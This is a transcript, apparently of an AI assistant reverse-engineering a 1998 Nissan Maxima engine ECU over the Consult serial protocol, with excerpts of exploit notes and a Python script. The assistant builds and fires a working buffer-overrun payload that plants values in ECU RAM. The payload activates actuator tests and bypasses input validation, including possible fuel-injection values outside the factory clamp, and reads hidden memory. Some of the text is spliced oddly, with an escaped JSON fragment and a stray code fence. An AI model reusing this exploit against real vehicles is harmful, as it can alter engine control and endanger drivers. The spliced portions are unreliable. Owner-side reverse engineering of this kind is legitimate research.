535	  fixed data — a descriptor-table pointer, or two 16-bit words read from ROM at
536	  `table_base + offset` (even the underflow source `table_base + $FC` is ROM, never the
537	  `$08xx` argument buffer). The only indexed write that could be *redirected* onto `$07A0`
538	  is the at_values store (`$519D`, dest `$076F + at_slot`); `at_slot` would have to reach
539	  `$31` (49) and it is written only at `$515F`, from the descriptor, maxing at 45 — and
540	  nowhere else in the image, so it can't be left stale high either. **Conclusion:
541	  `cs_streamlist` is unconditionally fixed-content; `consult_reply_direct`'s missing hole
542	  check cannot be aimed from the Consult interface.** Lead closed.
543	- **Exhaustively enumerated the entries, too.** For completeness (since `0A` can be fired
544	  any number of times), every accepted direct-mode `(first-byte, value)` was enumerated —
545	  71 configurations across the five dispatches, each producing two `cs_streamlist` words
546	  from its fixed `table_base + offset` (including the `value=$80` underflow to `+$FC`).
547	  **None of the 142 resulting addresses falls in `$5D40–$623F`.** Every one is low RAM/IO
548	  (`$03xx–$08xx`), low ROM (`$23xx–$25xx`), or fixed garbage (`$90F9`,`$5809`,`$42F8`,
549	  `$8958`) — all bank-0 and already `C9`-readable. Nearest misses: `fb=5 v=$80` → `$5809`
550	  (just below the hole) and `fb=6 v=$80` → `$FF29` (inside `$FE00–$FFCF`, already readable
551	  with `$1207.5` clear). So the engine cannot be handed a hole address, and since it is a
552	  single dereference (`mem[entry]`, not `mem[mem[entry]]`), no RAM cell we can write turns
553	  into a second hop. The hidden code at `$5D40–$623F` stays off-limits to software.
554

## assistant 2026-11-16T00:44:45.632Z

Here's what the write primitive concretely gets you, organized by what's actually useful versus theoretical:

---

**Things that work (confirmed or straightforward):**

1. **Write to `cs_streamlist` ($07A0–$07A3)** — this is the big one the ROM analysis flagged as a dead end from the normal interface. The overrun *can* reach $07A0. `consult_reply_direct` dereferences streamlist entries as raw bank-0 addresses with **no range check and no forwarding logic**. So if you write a 16-bit address into $07A0, then fire `0A` direct mode, it reads *that* address back to you. This bypasses the $5D40–$623F forward — you'd read the main CPU's own memory at those addresses, not the H8's. The constraint is the 16-bit value you can write is pinned to $0D40–$123F, so you'd be reading back from that range on the main CPU — but that's memory C9 already reaches, so it's not *new* access. Still, it's a confirmed write to a location the analysis said was unreachable.

2. **Set `at_active` flags ($07B7–$07C2)** — already confirmed by the actuator test. You can set arbitrary bits in the active-test flag bytes. The handlers that have bank-0 code will respond:
   - **$07B7 bit 1** → test `81`, fuel injection (reads value from $0770)
   - **$07B7 bit 2** → test `82`, ignition timing (bank 1 handler, but flag still sets)
   - **$07B7 bit 5** → test `85`, IACV-AAC idle air
   - **$07B8 bit 4** → test `8C`, forces an idle-air path
   - **$07B9 bits** → fan relays (bank 1 — but $07F1.2 still gets set, signaling the H8)

3. **Set `at_req` flags ($07AC–$07B6)** — these are the "request" flags that get copied to `at_active` on F0. Writing them means the *next* normal Consult command cycle activates those tests without you ever sending `0A`.

4. **Write `at_values` ($076F–$079C)** — the value bytes that active-test handlers consume. Combined with setting the flag bits above, you can activate a test *and* choose its parameter. For the bank-0 tests: fuel injection percentage, IACV step count, purge volume.

5. **Corrupt `cs_argbuf` ($08D2)** — the argument buffer for the next Consult command. You could pre-load C9 addresses that a subsequent normal command would read, though this is more "weird" than useful.

**Things that are interesting but limited:**

6. **Signal the H8 indirectly.** Any active test flag sets $07F1.2, which is sent to the second CPU in the outgoing message block. The H8 sees "an active test is running" but you can't control *which* test the H8 thinks it is — the H8 reads the flag bytes through the shared RAM interface, and the relay drivers (fuel pump $89, fans $93/$94) are in H8 code you can't see. So the flags *might* make the H8 act, but you're flying blind.

7. **Scramble the Consult reply builder state** — you can set the reply cursor and hidden_n to arbitrary values, causing the reply builder to cycle through corrupted idx entries. Each frame writes `c9_sub_value` to a different cs_payload offset. This is the mechanism the actuator test already uses, but you could aim it at other payload slots to confuse a Consult scan tool reading the stream.

**Things you cannot do:**

- Read the H8's program ROM (only $0D40–$123F via the forward window — data/scratch RAM, not code)
- Execute code or redirect a jump (no RAM function pointers exist)
- Write outside $0740–$08D6
- Control the downstream OOB write's *value* (it's whatever the H8 last sent back)
- Fire the unsafe parameter tests ($81/$82/$85) safely with the engine running

**The most interesting unexplored angle** is #4 combined with #2: using the overrun to write a chosen value into `at_values` *and* set the corresponding `at_active` flag in one sequence, without ever sending `0A`. That gives you active-test activation through a path the ECU's `0A` input validation never sees — so you could in principle set test parameters outside the ROM descriptor's clamping ranges (e.g., fuel injection beyond 75–125%). Whether the handler re-clamps or trusts the byte is worth checking in the disassembly.

Set `at_req` flags (`$07AC–$07B6`)\n\nThe \"request\" flags that get copied to `at_active` on F0. Writing them\nmeans the next normal Consult command cycle activates those tests without\never sending `0A`.\n\n### 4. Write `at_values` (`$076F–$079C`)\n\nThe value bytes that active-test handlers consume. Combined with setting\nthe flag bits (#2/#3), this activates a test and chooses its parameter\nthrough a path that bypasses `0A` input validation entirely.\n\nFor bank-0 tests with known handlers: fuel injection percentage (`$0770`),\nIACV step count (`$0774`), purge volume (`$0787`).\n\n**Unexplored angle:** `0A` descriptors clamp some values (e.g. fuel\ninjection to `$4B–$7D`). Writing through the overrun skips the descriptor\nlookup, so the handler sees whatever byte you placed. Whether the handler\nre-clamps or trusts the value is worth checking in the disassembly.\n\n### 5. Signal the H8 indirectly\n\nAny active-test flag sets `$07F1.2`, which is sent to the second CPU in\nthe outgoing message block. The H8 sees \"an active test is running.\"\nThe relay drivers (fuel pump `89`, fans `93`/`94`) are in H8 code — the\nflags might make it act, but you're flying blind without the H8 ROM.\n\n### 6. Corrupt the reply builder state\n\nSetting the reply cursor and `c9_hidden_n` to arbitrary values causes the\nreply builder to cycle through corrupted idx entries. Each frame writes\n`c9_sub_value` to a different `cs_payload` offset. This is the mechanism\n`c9_actuator_test.py` already uses.\n\n### 7. Pre-load `cs_argbuf` (`$08D2`)\n\nThe argument buffer for the next Consult command. You could pre-load C9\naddresses that a subsequent normal command would read, though this is more\nstrange than useful.\n\n## What does not work\n\n- **Read the H8's program ROM.** The forward window covers `$0D40–$123F`\n  only — data/scratch RAM, not code.\n- **Execute code.** No RAM function pointer exists to hijack. The only\n  indirect jump (`$CAF1`) uses a fixed 9-entry ROM table, X bounded 0–8.\n- **Write outside `$0740–$08D6`.** Both index masks are `& $FF`; the base\n  addresses (`$07C3` for addr, `$07D7` for idx, `$0740` for downstream)\n  anchor the window.\n- **Control the downstream write's value.** It's `c9_sub_value` — whatever\n  the H8 last sent back, not something the caller chooses.\n- **Reach bank 1.** Data bank register is hardcoded to 0 (`$3D80`, `$4486`),\n  never changed. No long-indirect read exists in the ROM.\n- **Fire parameter tests safely with engine running.** `81` (injection),\n  `82` (timing), `85` (IACV) have real effects on the running engine.\n"
````json
}
````

## assistant 2026-11-16T00:53:17.827Z

Here's the answer: **the chain is architecturally sound but killed by a coupling constraint in practice.**

The theory works like this:

1. The downstream OOB write CAN reach `cs_streamlist` ($07A0–$07A3) — that's `cs_payload` offset `$60–$63`
2. `consult_reply_direct` dereferences streamlist entries with no forwarding — would read the main CPU's own $5D40–$623F
3. Two overrun sequences (re-init between, no key cycle) could write both bytes of a 16-bit address

**The coupling that kills it:** the downstream write uses `c9_sub_value` as the written byte, which is the H8's reply for the address being forwarded. And the trigger address determines BOTH the cs_payload offset (low byte) AND the H8 address queried (the whole word). So:

- To write to `cs_streamlist[0]` high byte at `$07A1`, the offset must be `$61`, which locks the H8 address low byte to `$61`
- You need the H8 to return `$5D–$62` at an address ending in `$61`
- The actual H8 bytes at `$0D61, $0E61, $0F61, $1061, $1161`: **`$7F, $00, $00, $00, $05`**
- None are anywhere near `$5D–$62`

The 3 bytes in the entire H8 dump that ARE in range (`$5F` at `$1182`, `$60` at `$1188`, `$62` at `$11BB`) have the wrong low bytes — they'd target `cs_payload[$82]`, `[$88]`, `[$BB]`, none of which are `cs_streamlist`.

Some H8 bytes do vary across dumps (`$1060` was `$C1`/`$C7`), so they're live sensor data. But they'd need to swing from `$C7` down to `$62` — a huge gap, unlikely under any engine condition.

**Bottom line:** you can't pick the written value and the write destination independently. The same address controls both, and the H8 RAM at the constrained offsets doesn't cooperate. The streamlist read bug stays a dead end — the ROM analysis conclusion holds, just for a different reason than it thought. The normal paths can't reach `cs_streamlist`, and the overrun *can* reach it but can't plant a useful address there.

Want me to update WRITE_PRIMITIVE.md with this analysis?

40	The ROM analysis flagged this as a dead end from the normal interface — no
41	Consult command can set `cs_streamlist` to anything other than fixed ROM
42	values. The overrun can reach `$07A0`.
43	
44	`consult_reply_direct` (`$9CDD`) dereferences streamlist entries as raw
45	bank-0 addresses with no range check and no forwarding logic. A write here
46	lets `0A` direct mode read back from an address of your choosing.
47	
48	Limitation: the 16-bit value is pinned to `$0D40–$123F`, which is already
49	C9-readable, so this doesn't unlock new memory. But it confirms the write
50	reaches a location the analysis called unreachable from Consult.
51	
52	### 2. Set `at_active` flags (`$07B7–$07C2`)
53	
54	Confirmed by `c9_actuator_test.py` — sustained `$02`/`$0B` visible during
55	streaming. Writing bits into the active-test flag bytes activates tests.
56	Bank-0 handlers that respond:
57	
58	| Flag | Test | Effect |
59	|---|---|---|
60	| `$07B7.01` | `80` | Coolant temp override (bank 1 handler) |
61	| `$07B7.02` | `81` | Fuel injection — clamped 75–125 %, writes alpha `$0730` |
62	| `$07B7.04` | `82` | Ignition timing (bank 1 handler) |
63	| `$07B7.20` | `85` | IACV-AAC opening — forces register `18`, ≤ 129 steps |
64	| `$07B8.10` | `8C` | Forces an idle-air path (`$BC22`) |
65	| `$07B9.08` | `93` | Cooling fan low (bank 1 — relay driver is on the H8) |
66	| `$07B9.10` | `94` | Cooling fan high (bank 1) |
67	| `$07BA.01` | `98` | Purge volume control — forces register `29` |
68	
69	### 3. Set `at_req` flags (`$07AC–$07B6`)
70	
71	The "request" flags that get copied to `at_active` on F0. Writing them
72	means the next normal Consult command cycle activates those tests without
73	ever sending `0A`.
74	
75	### 4. Write `at_values` (`$076F–$079C`)
76	
77	The value bytes that active-test handlers consume. Combined with setting
78	the flag bits (#2/#3), this activates a test and chooses its parameter
79	through a path that bypasses `0A` input validation entirely.
80	
81	For bank-0 tests with known handlers: fuel injection percentage (`$0770`),
82	IACV step count (`$0774`), purge volume (`$0787`).
83	
84	**Unexplored angle:** `0A` descriptors clamp some values (e.g. fuel
85	injection to `$4B–$7D`). Writing through the overrun skips the descriptor
86	lookup, so the handler sees whatever byte you placed. Whether the handler
87	re-clamps or trusts the value is worth checking in the disassembly.
88	
89	### 5. Signal the H8 indirectly
90	
91	Any active-test flag sets `$07F1.2`, which is sent to the second CPU in
92	the outgoing message block. The H8 sees "an active test is running."
93	The relay drivers (fuel pump `89`, fans `93`/`94`) are in H8 code — the
94	flags might make it act, but you're flying blind without the H8 ROM.
95	
96	### 6. Corrupt the reply builder state
97	
98	Setting the reply cursor and `c9_hidden_n` to arbitrary values causes the
99	reply builder to cycle through corrupted idx entries. Each frame writes
100	`c9_sub_value` to a different `cs_payload` offset. This is the mechanism
101	`c9_actuator_test.py` already uses.
102	
103	### 7. Pre-load `cs_argbuf` (`$08D2`)
104	
105	The argument buffer for the next Consult command. You could pre-load C9
106	addresses that a subsequent normal command would read, though this is more
107	strange than useful.
108	
109	## What does not work
110	
111	- **Read the H8's program ROM.** The forward window covers `$0D40–$123F`
112	  only — data/scratch RAM, not code.
113	- **Execute code.** No RAM function pointer exists to hijack. The only
114	  indirect jump (`$CAF1`) uses a fixed 9-entry ROM table, X bounded 0–8.
115	- **Write outside `$0740–$08D6`.** Both index masks are `& $FF`; the base
116	  addresses (`$07C3` for addr, `$07D7` for idx, `$0740` for downstream)
117	  anchor the window.
118	- **Control the downstream write's value.** It's `c9_sub_value` — whatever
119	  the H8 last sent back, not something the caller chooses.
120	- **Reach bank 1.** Data bank register is hardcoded to 0 (`$3D80`, `$4486`),
121	  never changed. No long-indirect read exists in the ROM.
122	- **Fire parameter tests safely with engine running.** `81` (injection),
123	  `82` (timing), `85` (IACV) have real effects on the running engine.
124

## assistant 2026-11-16T01:16:23.265Z

Here's what I found:

**Yes, the chain works.** The ROM analysis concluded `cs_streamlist` was unreachable — that's only true through normal Consult paths. The overrun's downstream OOB *can* reach it, and by exploiting a subtlety the original analysis missed: when `$07E3` bits 0+1 are both set by the repair, the reply builder's first frame writes the **stale** `c9_sub_value` from the overrun — a byte you choose — before any H8 reply arrives. This breaks the coupling between target offset and H8 address.

The concrete chain:
1. Fire a crafted 20-address overrun that plants a target address into `cs_streamlist`
2. Re-init, then fire `0A` direct mode
3. `consult_reply_direct` reads the planted address with no forwarding — you get the **main CPU's own memory** at `$5D40–$623F`, not the H8's

**Results across all four H8 dumps: 65 readable addresses** spanning the full hidden region (`$5D80`–`$6225`), limited to 13 distinct low bytes by the H8 reply chain. That's ~5% of the 1280-byte region — scattered samples, but enough to identify code vs data patterns, instruction boundaries, and structure without desoldering the H8.

Updated `WRITE_PRIMITIVE.md` with the full chain description, payload layout, and achievable address list.

5	(`pip install pyserial`); pass the port as e.g. `--dev COM4`.
6	"""
7	import datetime
8	import os
9	import time
10	
11	if os.name == "nt":
12	    import serial
13	else:
14	    import fcntl
15	    import select
16	    import struct
17	    import termios
18	
19	DEFAULT_DEV = "COM4" if os.name == "nt" else "/dev/ttyUSB0"
20	
21	
22	class Transport:
23	    def __init__(self, dev=DEFAULT_DEV, log_path=None):
24	        self.dev = dev
25	        if os.name == "nt":
26	            # Same as .NET SerialPort defaults, which ECUTalk relies on: DTR and RTS off.
27	            self.port = serial.Serial()
28	            self.port.port, self.port.baudrate, self.port.timeout = dev, 9600, 0
29	            self.port.dtr = self.port.rts = False
30	            self.port.open()
31	        else:
32	            self.fd = os.open(dev, os.O_RDWR | os.O_NOCTTY | os.O_NONBLOCK)
33	            self._configure()
34	        self.t0 = time.monotonic()
35	        self.log = open(log_path, "a") if log_path else None
36	        self.note(f"open {dev} at {datetime.datetime.now().isoformat(timespec='seconds')}")
37	
38	    def _configure(self):
39	        # Raw mode, 9600 8N1, no flow control (CONSULT_PROTOCOL.md §2).
40	        attrs = termios.tcgetattr(self.fd)
41	        iflag, oflag, cflag, lflag, ispeed, ospeed, cc = attrs
42	        iflag = 0
43	        oflag = 0
44	        lflag = 0
45	        # No HUPCL, so closing the port doesn't toggle DTR either.
46	        cflag = termios.CS8 | termios.CREAD | termios.CLOCAL
47	        cc[termios.VMIN] = 0
48	        cc[termios.VTIME] = 0
49	        termios.tcsetattr(self.fd, termios.TCSANOW,
50	                          [iflag, oflag, cflag, lflag, termios.B9600, termios.B9600, cc])
51	        # Linux raises DTR and RTS on open; drop them to match the Windows path (and
52	        # .NET SerialPort / ECUTalk), which is the setup verified on the car.
53	        fcntl.ioctl(self.fd, termios.TIOCMBIC,
54	                    struct.pack("I", termios.TIOCM_DTR | termios.TIOCM_RTS))
55	        termios.tcflush(self.fd, termios.TCIOFLUSH)
56	
57	    def _ts(self):
58	        return time.monotonic() - self.t0
59	
60	    def _write_log(self, tag, text):
61	        if self.log:
62	            self.log.write(f"{self._ts():10.6f} {tag} {text}\n")
63	            self.log.flush()
64	
65	    def note(self, text):
66	        """Free-text line in the log, e.g. what the operator just did."""
67	        self._write_log("##", text)
68	
69	    def write(self, data: bytes):
70	        self._write_log("TX", data.hex(" "))
71	        if os.name == "nt":
72	            self.port.write(data)
73	            self.port.flush()
74	        else:
75	            os.write(self.fd, data)
76	            termios.tcdrain(self.fd)
77	
78	    def _read_chunk(self, n, timeout):
79	        if os.name == "nt":
80	            self.port.timeout = timeout
81	            return self.port.read(n)
82	        r, _, _ = select.select([self.fd], [], [], timeout)
83	        return os.read(self.fd, n) if r else b""
84	
85	    def read(self, n, timeout=0.5) -> bytes:
86	        """Read up to n bytes, giving up `timeout` seconds after the last byte arrived."""
87	        buf = bytearray()
88	        while len(buf) < n:
89	            chunk = self._read_chunk(n - len(buf), timeout)
90	            if not chunk:
91	                break
92	            self._write_log("RX", chunk.hex(" "))
93	            buf += chunk
94	        return bytes(buf)
95	
96	    def drain(self, quiet=0.2, limit=3.0) -> bytes:
97	        """Read everything until the line has been silent for `quiet` seconds."""
98	        buf = bytearray()
99	        end = time.monotonic() + limit
100	        while time.monotonic() < end:
101	            chunk = self.read(256, timeout=quiet)
102	            if not chunk:
103	                break
104	            buf += chunk
105	        return bytes(buf)
106	
107	    def close(self):
108	        self.note("close")
109	        if os.name == "nt":
110	            self.port.close()
111	        else:
112	            os.close(self.fd)
113	        if self.log:
114	            self.log.close()
115

95	def build_payload(target, trigger_override=None):

101	    The payload is:
102	      [0..14]  15 × main_addr    — overrun fills idx[0..9] with target byte
103	      [15]     repair_a           — sets up n for i=16's addr_store to hit $07E3
104	      [16]     repair_b           — addr_store writes lo byte (bit 0 set) to $07E3

107	    Repair logic (from the $9B3F disassembly):
108	      At i=15, addr_store writes word to $07E1/$07E2.  To make n=$10 at i=16
109	      we need the idx_store at i=15 to leave $07E1 such that INC → $10.
110	      The idx_store reads lo byte of $07E1 as n, writes i=15=$0F to $07D7+n,
111	      then INC.  With lo=$0A: idx_store → $07D7+$0A = $07E1, writes $0F,
112	      INC → $10.  At i=16 (n=$10), addr_store → $07C3+$20 = $07E3, writes
113	      the word for repair_b.  repair_b's lo byte must be ODD (bit 0 set).
114	      We use lo=$0B → $07E3 = $0B (bits 0+1 both set).

116	    idx = (target - CS_PAYLOAD) & 0xFF
117	
118	    if trigger_override is not None:

143	    addrs = [main_addr] * 15 + [repair_a, repair_b, main_addr]
144	    return addrs, main_addr, repair_a, repair_b

194	        n_re = rw(HIDDEN_N) & 0xFF

199	        elif idx_dest == REPLY_CURSOR:

206	        wb(HIDDEN_N, (rb(HIDDEN_N) + 1) & 0xFF)
207	
208	        if 2 * (i + 1) >= cs_argc:
209	            break
210	
211	    # Summary
212	    n_final = rb(HIDDEN_N)
213	    cursor = rb(REPLY_CURSOR)
214	    flags = rb(FWD_FLAGS)
215	    events.append("")
216	    events.append(f"  c9_hidden_n ($07E1) = ${n_final:02X} ({n_final})")
217	    events.append(f"  reply cursor ($07E2) = ${cursor:02X}")
218	    events.append(f"  fwd_flags ($07E3) = ${flags:02X}  "
219	                  f"bit0={'SET' if flags & 1 else 'CLR'}  "
220	                  f"bit1={'SET' if flags & 2 else 'CLR'}")
221	
222	    return ram, events
223	
224	
225	def simulate_reply_builder(ram, n_frames=20):
226	    """Model consult_reply_c9 ($9B3F) per-frame behavior with corrupted state.
227	
228	    The builder processes ONE hidden entry per frame:
229	      1. Check $07E3 bit 0 — if clear, skip (no forwarded addresses)
230	      2. Check $07E3 bit 1 — if clear, set it, cursor=0, request first addr (no write)
231	      3. If bit 1 set: read idx[cursor], write c9_sub_value to cs_payload[idx], advance
232	
233	    Returns list of (frame_num, target_addr, idx_val, cursor_before) for each write.
234	    """
235	    def rb(a): return ram.get(a, 0)
236	    def wb(a, v): ram[a] = v & 0xFF
237	
238	    flags = rb(FWD_FLAGS)
239	    if not (flags & 0x01):
240	        return []
241	
242	    writes = []
243	    for frame in range(n_frames):
244	        if not (rb(FWD_FLAGS) & 0x01):
245	            break
246	
247	        if not (rb(FWD_FLAGS) & 0x02):
248	            # First frame: set bit 1, cursor = 0, request first address, no value placed
249	            wb(FWD_FLAGS, rb(FWD_FLAGS) | 0x02)
250	            wb(REPLY_CURSOR, 0)
251	        else:
252	            # Read c9_sub_value and place it
253	            sub_val = rb(0x07E7)
254	            cursor = rb(REPLY_CURSOR)
255	            idx_val = rb(HIDDEN_IDX + cursor)
256	            target = CS_PAYLOAD + idx_val
257	            writes.append((frame, target, idx_val, cursor, sub_val))
258	
259	            # Advance cursor
260	            new_cursor = (cursor + 1) & 0xFF
261	            if new_cursor == rb(HIDDEN_N):
262	                new_cursor = 0
263	            wb(REPLY_CURSOR, new_cursor)
264	
265	    return writes
266	
267	
268	def region_label(addr):
269	    for name, (lo, hi_) in [
270	        ("cs_payload", (CS_PAYLOAD, CS_PAYLOAD + 0x28)),
271	        ("at_values", (AT_VALUES, AT_VALUES + 0x2D)),
272	        ("cs_streamlist", (CS_STREAMLIST, CS_STREAMLIST + 4)),
273	        ("at_req", (AT_REQ, AT_REQ + 0x0B)),
274	        ("at_active", (AT_ACTIVE, AT_ACTIVE + 0x0C)),
275	    ]:
276	        if lo <= addr < hi_:
277	            return f"{name}[{addr - lo}]"
278	    return ""
279	
280	
281	def build_monitor_addrs():
282	    addrs = set()
283	    for start, length, _ in MONITOR_REGIONS:
284	        addrs.update(range(start, start + length))
285	    return sorted(addrs)
286	
287	
288	def read_addrs(c, addrs):
289	    result = bytearray()
290	    for i in range(0, len(addrs), 8):
291	        chunk = addrs[i:i + 8]
292	        result += c.read_memory(chunk)
293	    return bytes(result)
294	
295	
296	def region_dump(data, addrs, title):
297	    print(f"\n  {title}")
298	    addr_to_val = dict(zip(addrs, data))
299	    for start, length, label in MONITOR_REGIONS:
300	        row = [addr_to_val.get(start + i) for i in range(length)]
301	        cells = [f"{v:02X}" if v is not None else ".." for v in row]
302	        print(f"    ${start:04X}: {' '.join(cells)}  ; {label}")
303	
304	
305	def run_dry(target, addr_list, main_addr):
306	    idx = (target - CS_PAYLOAD) & 0xFF
307	    word = main_addr - 0x5000
308	
309	    print(f"=== Dry run: {len(addr_list)} addresses ===")
310	    print(f"Target:       ${target:04X} ({region_label(target) or '?'})")
311	    print(f"Main addr:    ${main_addr:04X} (word ${word:04X}, lo=${word & 0xFF:02X})")
312	    print(f"Payload:      15×${main_addr:04X} + ${addr_list[15]:04X} + "
313	          f"${addr_list[16]:04X} + ${addr_list[17]:04X}")
314	    print()
315	
316	    ram, events = simulate_overrun(addr_list)
317	    for e in events:
318	        print(e)
319	
320	    flags = ram.get(FWD_FLAGS, 0)
321	    if not (flags & 0x01):
322	        print(f"\n✗ $07E3 bit 0 CLEAR — reply builder will skip hidden processing.")
323	        print(f"  The downstream write cannot fire.")
324	        return ram, [], False
325	
326	    print(f"\n  Reply builder simulation (one entry per frame):")
327	    writes = simulate_reply_builder(dict(ram), n_frames=25)
328	
329	    targets_hit = set()
330	    for frame, t_addr, idx_val, cursor, sub_val in writes:
331	        lbl = region_label(t_addr)
332	        marker = " ◄" if t_addr == target else ""
333	        print(f"    frame {frame:2d}: cursor=${cursor:02X} → "
334	              f"idx=${idx_val:02X} → ${t_addr:04X}"
335	              f"{'  (' + lbl + ')' if lbl else ''}"
336	              f"  val=${sub_val:02X}{marker}")
337	        targets_hit.add(t_addr)
338	        if frame >= 20:
339	            break
340	
341	    hit = target in targets_hit
342	    print()
343	    if hit:
344	        first = next(f for f, t, *_ in writes if t == target)
345	        print(f"✓ Target ${target:04X} HIT on frame {first}.")
346	    else:
347	        print(f"✗ Target ${target:04X} not reached in {len(writes)} frames.")
348	
349	    return ram, writes, hit
350	
351	
352	def run_live(dev, target, addr_list, main_addr, n_hold_frames=20):
353	    """Fire the overrun and monitor the target region."""
354	    # Append the target as a non-forwarded probe: it reads live RAM each frame,
355	    # giving us visibility into the downstream write WITHOUT waiting for stop.
356	    probe_list = addr_list + [target]
357	    n_addrs = len(probe_list)
358	    probe_pos = len(addr_list)  # last byte in each frame
359	
360	    mon_addrs = build_monitor_addrs()
361	    for a in range(target - 2, target + 3):
362	        if a not in mon_addrs:
363	            mon_addrs.append(a)
364	    mon_addrs = sorted(set(mon_addrs))
365	
366	    os.makedirs(LOG_DIR, exist_ok=True)
367	    log = os.path.join(LOG_DIR, f"{datetime.date.today()}_c9-actuator.log")
368	    t = Transport(dev, log)
369	    t.note(f"c9_actuator_test target=${target:04X} main=${main_addr:04X} "
370	           f"n={n_addrs}")
371	
372	    try:
373	        c = Consult(t)
374	        c.ecu_ids = ENGINE_IDS
375	
376	        r = c.init()
377	        if r is None:
378	            sys.exit("init failed (ignition on?)")
379	        attempt, secs, junk, ecu = r
380	        print(f"init ok: id {ecu:02X}, attempt {attempt}, {secs * 1000:.0f} ms")
381	
382	        # --- Baseline ---
383	        print(f"\nReading {len(mon_addrs)} baseline bytes...")
384	        before = read_addrs(c, mon_addrs)
385	        t.note(f"before ({len(before)} bytes)")
386	        region_dump(before, mon_addrs, "BEFORE (baseline)")
387	
388	        before_map = dict(zip(mon_addrs, before))
389	        target_before = before_map.get(target, 0)
390	        print(f"\n  target ${target:04X} = ${target_before:02X}")
391	
392	        # --- Trigger ---
393	        print(f"\nSending trigger: {n_addrs} C9 addresses "
394	              f"(18 overrun + 1 probe at ${target:04X}) + F0...")
395	        payload = b"".join(bytes([0xC9, a >> 8, a & 0xFF])
396	                          for a in probe_list)
397	        c.command(payload)
398	        t.note("trigger sent")
399	
400	        # Stream frames — each fires one downstream write.
401	        # The last byte of each frame is the probe: live RAM at the target.
402	        frames = []
403	        probe_vals = []
404	        try:
405	            for fi in range(n_hold_frames):
406	                f = c.read_frame(expected_len=n_addrs, timeout=1.0)
407	                frames.append(f)
408	                pv = f[probe_pos] if len(f) > probe_pos else None
409	                probe_vals.append(pv)
410	        except TimeoutError:
411	            pass
412	        c.stop()
413	        t.note(f"stopped after {len(frames)} frame(s)")
414	        print(f"  streamed {len(frames)} frame(s)")
415	
416	        # Per-frame probe values — this is the smoking gun
417	        print(f"\n  Per-frame probe (${target:04X} live RAM):")
418	        changed_frame = None
419	        for fi, pv in enumerate(probe_vals):
420	            marker = ""
421	            if pv is not None and pv != target_before and changed_frame is None:
422	                changed_frame = fi
423	                marker = " ◄ CHANGED"
424	            print(f"    frame {fi:2d}: ${pv:02X}{marker}" if pv is not None
425	                  else f"    frame {fi:2d}: ??")
426	
427	        if changed_frame is not None:
428	            print(f"\n  ✓ DOWNSTREAM WRITE VISIBLE on frame {changed_frame}: "
429	                  f"${target_before:02X} → ${probe_vals[changed_frame]:02X}")
430	        else:
431	            print(f"\n  probe unchanged across {len(frames)} frames "
432	                  f"(all ${target_before:02X})")
433	
434	        # --- After ---
435	        print(f"\nReading {len(mon_addrs)} bytes again...")
436	        after = read_addrs(c, mon_addrs)
437	        t.note(f"after ({len(after)} bytes)")
438	        region_dump(after, mon_addrs, "AFTER (post-overrun)")
439	
440	        after_map = dict(zip(mon_addrs, after))
441	        target_after = after_map.get(target, 0)
442	
443	        # --- Diff ---
444	        n_changed = 0
445	        print(f"\n  CHANGES:")
446	        print(f"  {'addr':>6s}  {'before':>6s}  {'after':>6s}  description")
447	        print(f"  {'─' * 6}  {'─' * 6}  {'─' * 6}  {'─' * 30}")
448	        for i, a in enumerate(mon_addrs):
449	            b, af = before[i], after[i]
450	            if b != af:
451	                n_changed += 1
452	                lbl = region_label(a) or LABELS.get(a, "")
453	                print(f"  ${a:04X}   ${b:02X}     ${af:02X}     {lbl}")
454	        if n_changed == 0:
455	            print(f"  (none)")
456	
457	        # --- Verdict ---
458	        print(f"\n{'=' * 60}")
459	        if target_before != target_after:
460	            print(f"DOWNSTREAM WRITE CONFIRMED: ${target:04X} changed "
461	                  f"${target_before:02X} → ${target_after:02X}")
462	            lbl = region_label(target)
463	            if lbl:
464	                print(f"  location: {lbl}")
465	            print(f"  The overrun chain reached active-test state.")
466	        elif n_changed > 0:
467	            print(f"OVERRUN FIRED — {n_changed} byte(s) changed, but target "
468	                  f"${target:04X} unchanged (${target_before:02X}).")
469	            flags_after = after_map.get(FWD_FLAGS, 0)
470	            if not (flags_after & 0x01):
471	                print(f"  $07E3 = ${flags_after:02X}: bit 0 still clear — "
472	                      f"flag repair didn't stick.")
473	            else:
474	                print(f"  $07E3 = ${flags_after:02X}: flag OK, check cursor path.")
475	        else:
476	            print(f"NO CHANGE — key-cycle and retry.")
477	        print(f"{'=' * 60}")
478	
479	        # --- Persistence ---
480	        print(f"\nRe-init...")
481	        r = c.init()
482	        if r:
483	            post = read_addrs(c, mon_addrs)
484	            persisted = sum(1 for b, a, p in zip(before, after, post)
485	                           if b != a and a == p)
486	            cleared = sum(1 for b, a, p in zip(before, after, post)
487	                          if b != a and a != p)
488	            if persisted:
489	                print(f"  {persisted} corrupted byte(s) PERSIST (key cycle to clear)")
490	            if cleared:
491	                print(f"  {cleared} corrupted byte(s) cleared by re-init")
492	        else:
493	            print(f"  re-init failed")
494	
495	    except (ConsultError, TimeoutError) as e:
496	        print(f"error: {e}")
497	    finally:
498	        t.close()
499	        print(f"\nlog: {log}")
500	
501	
502	def main():
503	    ap = argparse.ArgumentParser(
504	        description=__doc__,
505	        formatter_class=argparse.RawDescriptionHelpFormatter)
506	    ap.add_argument("--target", type=lambda x: int(x, 16), default=AT_ACTIVE + 1,
507	                    help=f"target RAM address in hex (default: {AT_ACTIVE + 1:04X} = at_active[1])")
508	    ap.add_argument("--trigger", type=lambda x: int(x, 16), default=None,
509	                    help="override trigger address (hex); must be in forwarded range")
510	    ap.add_argument("--dev", default=DEFAULT_DEV,
511	                    help=f"serial device (default: {DEFAULT_DEV})")
512	    ap.add_argument("--frames", type=int, default=20,
513	                    help="frames to stream after trigger (default: 20)")
514	    ap.add_argument("--dry-run", action="store_true",
515	                    help="simulate only, don't talk to the ECU")
516	    args = ap.parse_args()
517	
518	    target = args.target
519	    if not (DOWNSTREAM_LO <= target <= DOWNSTREAM_HI):
520	        sys.exit(f"target ${target:04X} outside downstream range "
521	                 f"${DOWNSTREAM_LO:04X}–${DOWNSTREAM_HI:04X}")
522	
523	    result = build_payload(target, args.trigger)
524	    if result is None:
525	        sys.exit(f"no valid trigger addresses for target ${target:04X}"
526	                 + (f" with override ${args.trigger:04X}" if args.trigger else ""))
527	    addr_list, main_addr, repair_a, repair_b = result
528	
529	    print("c9_actuator_test: write to active-test state via overrun chain")
530	    print(f"Target ECU: 23710-2L904 (1998 Maxima VQ30DE)")
531	    print()
532	
533	    ram, writes, hit = run_dry(target, addr_list, main_addr)
534	    print()
535	
536	    if args.dry_run:
537	        print("(dry run only)")
538	        return
539	
540	    if not hit:
